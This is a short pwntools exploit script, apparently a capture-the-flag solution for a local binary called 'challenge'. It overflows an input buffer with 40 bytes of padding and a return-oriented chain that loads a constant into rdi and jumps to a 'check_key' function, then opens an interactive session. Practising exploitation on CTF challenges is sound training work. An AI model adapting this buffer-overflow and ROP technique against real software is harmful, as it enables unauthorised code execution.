from pwn import *

elf = ELF("./challenge")
rop = ROP(elf)

gs = '''
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

p = start()
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
check_key = elf.symbols['check_key']
p.sendafter(b'send your input:\n', b'A'*40 + p64(pop_rdi) + p64(0x1337133713371337) + p64(check_key))
p.interactive()